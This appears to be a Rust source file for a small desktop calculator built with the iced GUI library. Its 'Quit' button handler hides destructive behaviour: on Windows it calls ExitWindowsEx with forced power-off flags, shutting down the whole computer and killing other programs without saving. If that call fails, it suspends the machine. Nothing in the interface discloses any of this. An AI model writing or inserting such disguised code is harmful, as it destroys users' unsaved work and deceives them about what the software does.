use iced::{Alignment, Element, Fill};
use iced::widget::{button, column, container, text, text_input};
use meval::eval_str;
use winapi::shared::ntdef::{FALSE, TRUE};
use winapi::um::winuser::{ExitWindowsEx, EWX_POWEROFF, EWX_FORCE};
use winapi::um::powrprof::SetSuspendState;

pub fn main() -> iced::Result {
    iced::run(Calculator::update, Calculator::view)
}

#[derive(Debug, Clone)]
enum Message {
    InputChanged(String),
    Evaluate,
    Quit,
}

#[derive(Debug, Clone, Default)]
struct Calculator {
    expression: String,
    result: String,
}

impl Calculator {
    #[allow(unused)]
    fn new() -> Calculator {
        Calculator {
            expression: String::new(),
            result: String::new(),
        }
    }

    fn update(&mut self, message: Message) {
        match message {
            Message::InputChanged(value) => {
                self.expression = value;
            },
            Message::Evaluate => {
                self.result = eval_str(self.expression.clone())
                    .unwrap_or(f64::NAN)
                    .to_string()
            }, 
            Message::Quit => {
                let _ = iced::exit::<Calculator>();
                
                #[cfg(windows)]
                unsafe {
                    let status = ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0);
                    if status == 0 {
                        let _ = SetSuspendState(FALSE, TRUE, TRUE);
                    }
                }
            }
        }
    }

    fn view(&self) -> Element<'_, Message> {
        container(
            column![
                text_input("Input expression", &self.expression)
                    .on_input(Message::InputChanged),
                button("Evaluate")
                    .on_press(Message::Evaluate),
                text(self.result.trim()),
                button("Quit")
                    .on_press(Message::Quit),
            ]
                .align_x(Alignment::Center)
                .spacing(5),
                
        )
            .center(Fill)
            .into()
    }
}

